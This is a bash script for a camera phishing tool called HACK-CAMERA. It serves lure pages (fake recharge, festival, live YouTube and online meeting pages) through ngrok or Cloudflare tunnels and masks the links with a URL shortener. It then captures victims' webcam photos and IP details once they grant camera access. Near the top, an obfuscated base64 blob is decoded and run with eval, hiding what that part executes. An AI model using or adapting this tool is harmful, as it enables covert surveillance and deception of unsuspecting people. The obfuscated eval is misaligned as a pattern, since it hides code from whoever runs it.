#!/bin/bash

# HACK-CAMERA
# Version    : 1.5
# Description: HACK-CAMERA is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : X PHANTOM (PH4N70M)
# Github     : https://github.com/XPH4N70M
# Date       : 29-05-2022
# License    : MIT
# Copyright  : X PHANTOM PH4N7OM (2022-2023)
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

: '
MIT License

Copyright (c) 2022 X PHANTOM (PH4N7OM)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${red}[${white}+${red}] ${cyan}"
info2="${blue}[${white}•${blue}] ${yellow}"
ask="${red}[${white}?${red}] ${purple}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${red}[${white}√${red}] ${green}"



version="1.5"

cwd=`pwd`

# Logo
logo="
${green} _   _    _    ____ _  __      ____    _    __  __ _____ ____      _    
${cyan} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \   
${purple} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
${red} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
${green} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
${red}                                            [v${version}]
${blue}          [By XPHANTOM (PH4N70M) KasRoudra]
"

# Package Installer
pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

# Kill running instances of required packages
killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Delete ngrok file
ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}

# Set template
replacer() {
    while true; do
    if echo $option | grep -q "1"; then
        sed "s+forwarding_link+"$1"+g" grabcam.html > index2.html
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        break
    elif echo $option | grep -q "2"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "3"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
        sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "4"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" OnlineMeeting.html > index2.html
        break
    fi
    done
    echo -e "${info}Your urls are: \n"
    sleep 1
    echo -e "${success}URL 1 > ${1}\n"
    sleep 1
    netcheck
    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
    if ! [[ -z $masked ]]; then
        if echo $masked | head -n1 | grep -q "https://"; then
            echo -e "${success}URL 2 > ${masked}\n"
        fi
    fi
}


# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2


echo -e "\n${info}Please Wait!...\n"

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
    termux-fix-shebang hack_camera.sh
    termux=true
else
    termux=false
fi

# Workdir

if [ -z $DIRECTORY ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            if ! [ -d /sdcard/Pictures ]; then
                cd /sdcard && mkdir Pictures
            fi
            FOL="/sdcard/Pictures"
            cd "$FOL"
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
            cd "$cwd"
        else
            if [ -d "$HOME/Pictures" ]; then
                FOL="$HOME/Pictures"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi


# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
    if [[ $TUNNELER == "cloudflared" || $TUNNELER == "ngrok" ]]; then
        TN=${TUNNELER^}
    else
        TN="Cloudflared"
    fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi


# Set Package Manager
if [ `command -v sudo` ]; then
    sudo=true
    if [ `command -v apt` ]; then
        pac_man="sudo apt"
    elif  [ `command -v apt-get` ]; then
        pac_man="sudo apt-get"
    elif  [ `command -v yum` ]; then
        pac_man="sudo yum"
    elif [ `command -v dnf` ]; then
        pac_man="sudo dnf"
    elif [ `command -v apk` ]; then
        pac_man="sudo apk"
    elif [ `command -v pacman` ]; then
        pacman=true
    else
        echo -e "${error}No supported package manager found! Install packages manually!\007\n"
        exit 1
    fi
else
    sudo=false
    if [ `command -v apt` ]; then
        pac_man="apt"
    elif [ `command -v apt-get` ]; then
        pac_man="apt-get"
    elif [ `command -v brew` ]; then
        pac_man="brew"
    else
        echo -e "${error}No supported package manager found! Install packages manually!\007\n"
        exit 1
    fi
fi


# Install Dependicies
if ! [ `command -v php` ]; then
    echo -e "${info}Installing php...."
    $pac_man install php -y
    pacin php
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}Installing curl...."
    $pac_man install curl -y
    pacin "unzip"
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}Installing unzip...."
    $pac_man install unzip -y
    pacin "unzip"
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}Installing wget...."
    $pac_man install wget -y
    pacin "wget"
fi
if $termux; then
if ! [ `command -v proot` ]; then
    echo -e "${info}Installing proot...."
    pkg install proot -y
fi
if ! [ `command -v proot` ]; then
    echo -e "${error}Proot can't be installed!\007\n"
    exit 1
fi
fi
if ! [ `command -v php` ]; then
    echo -e "${error}PHP cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v curl` ]; then
    echo -e "${error}Curl cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v unzip` ]; then
    echo -e "${error}Unzip cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v wget` ]; then
    echo -e "${error}Wget cannot be installed!\007\n"
    exit 1
fi
if [ `pidof php > /dev/null 2>&1` ]; then
    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
    exit 1
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
    exit 1
fi

# Termux should run from home
if $termux; then
    if echo "$cwd" | grep -q "home"; then
        printf ""
    else
        echo -e "${error}Invalid directory. Run from home!\007\n"
        exit 1
    fi
fi

# Download tunnlers
if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
    if ! [[ -d $HOME/.ngrokfolder ]]; then
        cd $HOME && mkdir .ngrokfolder
    fi
    if ! [[ -d $HOME/.cffolder ]]; then
        cd $HOME && mkdir .cffolder
    fi
    arch=`uname -m`
    platform=`uname`
    while true; do
        echo -e "\n${info}Downloading Tunnelers:\n"
        netcheck
        if [ -e ngrok.zip ];then
            rm -rf ngrok.zip
        fi
        cd "$cwd"
        if echo "$platform" | grep -q "Darwin"; then
            if echo "$arch" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
                tar -zxf cloudflared.tgz > /dev/null 2>&1
                rm -rf cloudflared.tgz
                break
            elif echo "$arch" | grep -q "arm64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                ngrokdel
                echo -e "${error}Cloudflared not available for device architecture!"
                sleep 3
                break
            else
                echo -e "${error}Device architecture unknown. Download ngrok/cloudflared manually!"
                sleep 3
                break
            fi
        elif echo "$platform" | grep -q "Linux"; then
            if echo "$arch" | grep -q "aarch64"; then
                if [ -e ngrok-stable-linux-arm64.tgz ];then
                   rm -rf ngrok-stable-linux-arm64.tgz
                fi
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
                tar -zxf ngrok.tgz
                rm -rf ngrok.tgz
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                break
            elif echo "$arch" | grep -q "arm"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                break
            elif echo "$arch" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                break
            else
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                break
            fi
        else
            echo -e "${error}Unsupported Platform!"
            exit
        fi
    done
    sleep 1
    cd "$cwd"
    mv -f ngrok $HOME/.ngrokfolder
    mv -f cloudflared $HOME/.cffolder
    if $sudo; then
    sudo chmod +x $HOME/.ngrokfolder/ngrok
    sudo chmod +x $HOME/.cffolder/cloudflared
    else
    chmod +x $HOME/.ngrokfolder/ngrok
    chmod +x $HOME/.cffolder/cloudflared
    fi
fi

# Check for update
netcheck
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
    changelog=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/changelog.log`
    clear
    echo -e "$logo"
    echo -e "${info}HACK-CAMERA has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update HACK-CAMERA?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf HACK-CAMERA hack_camera && git clone https://github.com/XPH4N70M/HACK-CAMERA
            echo -e "\n${success}HACK-CAMERA updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
            echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Ngrok Authtoken
if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
    echo -e "\n${ask}Enter your ngrok authtoken:"
    printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
    read auth
    if [ -z $auth ]; then
        echo -e "\n${error}No authtoken!\n\007"
        sleep 1
    else
        cd $HOME/.ngrokfolder && ./ngrok authtoken ${auth}
    fi
fi

# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:

${red}[${white}1${red}] ${cyan}Jio Recharge
${red}[${white}2${red}] ${cyan}Festival
${red}[${white}3${red}] ${cyan}Live Youtube
${red}[${white}4${red}] ${cyan}Online Meeting
${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
${red}[${white}x${red}] ${cyan}About
${red}[${white}m${red}] ${cyan}More tools
${red}[${white}0${red}] ${cyan}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "${blue}\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
        read option
    else
        option=$OPTION
    fi
fi
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        break
    elif echo $option | grep -q "2"; then
        dir="fest"
        printf "\n${ask}Enter festival name:${blue}\n\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 2
        else
            fest_name="${fest_name//[[:space:]]/}"
            break
        fi
    elif echo $option | grep -q "3"; then
        dir="live"
        printf "\n${ask}Enter youtube video ID:${blue}\n\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            break
        fi
    elif echo $option | grep -q "4"; then
        dir="om"
        break
    elif echo $option | grep -q "t"; then
        if [ $TN == "Cloudflared" ]; then
            TN="Ngrok"
        else
            TN="Cloudflared"
        fi
        echo -e "${success}Tunneler switched to ${TN} successfully!\n"
        sleep 2
    elif echo $option | grep -q "p"; then
        printf "\n${ask}Enter Port:${blue}\n\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT=$pore;
            echo -e "\n${success}Port changed to ${PORT} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "d"; then
        printf "\n${ask}Enter Directory:${blue}\n\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 2
        else
            FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
            sleep 2
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[XPHANTOM (PH4N70M)]
$red[Github]     ${cyan} :[https://github.com/XPH4N70M]
$red[join us]    ${cyan} :[https://bit.ly/3LAy80f]"
        printf "${blue}\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/XPH4N70M/XPH4N70M#My-Best-Works"
    elif echo $option | grep -q "0"; then
        echo -e "\n${success}Thanks for using!\n"
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        OPTION=true
        sleep 1
    fi
done
cd $cwd
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi
if ! [ -d $dir ]; then
    mkdir $dir
    cd $dir
    netcheck
    wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/${dir}.zip"
    unzip ${dir}.zip > /dev/null 2>&1
    rm -rf ${dir}.zip
else
    cd $dir
fi

# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
sleep 2
echo -e "${info2}Starting tunnelers......\n"
rm -rf "$HOME/.cffolder/log.txt"
netcheck
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
if $termux; then
    cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
else
    cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
fi
sleep 8
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
if (echo "$ngroklink" | grep -q "ngrok"); then
    ngrokcheck=true
else
    ngrokcheck=false
fi
cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
if (echo "$cflink" | grep -q "cloudflare"); then
    cfcheck=true
else
    cfcheck=false
fi
while true; do
if ( $cfcheck && $ngrokcheck ); then
    if [ $TN == "Cloudflared" ]; then
        echo -e "${success}Cloudflared has been chosen!\n"
        replacer "$cflink"
    else
        echo -e "${success}Ngrok has been chosen!\n"
        replacer "$ngroklink"
    fi
    break
fi
if ( $cfcheck &&  ! $ngrokcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    replacer "$cflink"
    break
fi
if ( ! $cfcheck && $ngrokcheck ); then
    echo -e "${success}Ngrok has started successfully!\n"
    replacer "$ngroklink"
    break
fi
if ! ( $cfcheck && $ngrokcheck ); then
    echo -e "${error}Tunneling failed! Start your own tunneling service at port ${PORT}"
    break
fi
done
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${success}PHP started succesfully!\n"
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> $cwd/ips.txt
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Image downloaded! Check directory!\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
    sleep 0.5
done

